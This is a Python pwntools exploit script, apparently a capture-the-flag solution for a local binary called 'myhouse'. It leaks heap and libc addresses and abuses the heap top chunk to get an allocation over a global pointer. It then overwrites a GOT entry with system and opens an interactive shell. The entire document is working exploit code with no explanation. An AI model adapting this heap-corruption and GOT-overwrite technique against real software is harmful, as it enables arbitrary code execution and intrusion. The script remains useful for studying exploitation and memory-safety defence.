#!/usr/bin/env python
from pwn import *
p=process('./myhouse',env={'LD_PRELOAD':'./libc_64.so   '})

context(log_level='debug')
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def menu(i):
    ru('Your choice:\n')
    sl(str(i))

def new(size):
    menu(1)
    ru('What is the size of your room?\n')
    sl(str(size))

def edit(payload,sline=1):
    menu(2)
    ru('Make your room more shining!')
    if sline:
        sl(payload)
    else:
        sd(payload)
def show():
    menu(3)

def init(name,house_name,size,size1,description):
    ru('name?\n')
    sd(name)
    ru('house?\n')
    sd(house_name)
    ru('house?\n')
    sl(str(size))
    ru('Too large!\n')
    sl(str(size1))
    ru('Give me its description:\n')
    sl(description)

def debugf(load=''):
    gdb.attach(p,load)

init('a'*0x20,'\xff'*0x100,0x6c5b68+1,0x300000,'\xff')
show()
ru('a'*0x20)
heap=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x10
print(hex(heap))

top=heap+0x100
print(hex(top))

target=0x6020c0
size=target-top-0x20
print(hex(top+size))

new(size)
new(0x10)
edit(p64(0x602018)+p64(0x602058),0)
show()
ru('description:\n')
libc_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0xf7280 
print(hex(libc_base))
libc=ELF('./libc_64.so')
libc.address=libc_base
system=libc.symbols['system']
edit(p64(system),0)
sleep(1)
sl('/bin/sh\x00')

p.interactive()